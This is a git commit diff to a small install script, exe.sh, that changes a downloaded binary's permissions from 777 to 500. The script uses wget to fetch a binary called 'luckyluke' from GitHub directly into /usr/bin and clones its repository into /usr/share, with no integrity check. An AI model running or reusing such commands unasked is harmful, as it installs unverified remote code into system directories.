d5f21a2a73a03fe6e621f7c3644c43314a9b774e
Ertan Sözer <70058769+ertanszr-git@users.noreply.github.com>
2022-04-09 14:26:18 +0300

    Update exe.sh

--- exe.sh
+++ exe.sh
@@ -1,5 +1,5 @@
 cd /usr/bin/
 wget https://raw.githubusercontent.com/rotherda/Lucky-Luke-v2.0/main/luckyluke
-chmod 777 luckyluke
+chmod 500 luckyluke
 cd /usr/share/
 git clone https://github.com/rotherda/Lucky-Luke-v2.0/
